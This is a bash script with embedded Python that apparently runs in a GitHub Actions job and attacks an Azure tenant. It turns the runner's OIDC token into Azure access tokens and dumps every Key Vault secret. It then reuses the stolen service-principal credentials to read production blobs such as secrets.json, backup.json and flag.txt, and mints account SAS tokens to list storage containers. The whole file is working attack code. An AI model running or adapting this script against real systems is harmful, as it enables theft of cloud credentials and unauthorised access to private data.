#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
RG="rg-tbl-platform-prod-sea"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
KVT=oidc("https://vault.azure.net/.default"); ARM0=oidc("https://management.azure.com/.default")
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass

def sttok(c):
    if c is None: return oidc("https://storage.azure.com/.default")
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://storage.azure.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")
def armtok(c):
    if c is None: return ARM0
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")

ALL=[("__oidc__",None)]+list(creds.items())
BLOBS=[("sttblappcfgprodx3euoz","config","internal-config.json"),
       ("sttblappcfgprodx3euoz","config","settings.json"),
       ("sttblbackupprodx3euoz","exports","internal-config.json"),
       ("sttblbackupprodx3euoz","exports","flag.txt"),
       ("sttblbackupprodx3euoz","exports","secrets.json"),
       ("sttblbackupprodx3euoz","exports","kv-tbl-sec.json"),
       ("sttblbackupprodx3euoz","exports","backup.json")]

print("### direct blob GET (list denied != read denied)")
print("-- anonymous")
for a,c,n in BLOBS:
    st,b=http(f"https://{a}.blob.core.windows.net/{c}/{n}")
    print(f"   {a}/{c}/{n}: {st} {b[:120] if st==200 else ''}")
for name,cr in ALL:
    t=sttok(cr)
    if not t: continue
    H={"Authorization":"Bearer "+t,"x-ms-version":"2021-08-06"}
    hits=[]
    for a,c,n in BLOBS:
        st,b=http(f"https://{a}.blob.core.windows.net/{c}/{n}", headers=H)
        if st==200: hits.append(f"{a}/{c}/{n} => {b[:400]}")
        elif st not in (403,404): hits.append(f"{a}/{c}/{n} HTTP {st}")
    print(f"-- {name}: " + ("; ".join(hits) if hits else "no reads"))

print("\n### listAccountSas / listServiceSas")
for name,cr in ALL:
    t=armtok(cr)
    if not t: continue
    H={"Authorization":"Bearer "+t}
    for a in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"):
        u=(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/"
           f"Microsoft.Storage/storageAccounts/{a}/ListAccountSas?api-version=2023-01-01")
        req=urllib.request.Request(u, data=json.dumps({"signedServices":"b","signedResourceTypes":"sco",
            "signedPermission":"rl","signedExpiry":"2026-10-23T00:00:00Z","signedProtocol":"https"}).encode(),
            headers={"Authorization":"Bearer "+t,"Content-Type":"application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=30) as r: st2,b2=r.status,r.read()
        except urllib.error.HTTPError as e: st2,b2=e.code,e.read()
        except Exception as e: st2,b2=0,str(e).encode()
        if st2==200:
            tokq=jg(b2).get("accountSasToken","")
            print(f"   {name} {a}: SAS OK")
            st3,b3=http(f"https://{a}.blob.core.windows.net/?comp=list&{tokq}")
            print("      containers:", st3, b3[:200])
        else:
            print(f"   {name} {a}: {st2}")
PYEOF
echo "=== done ==="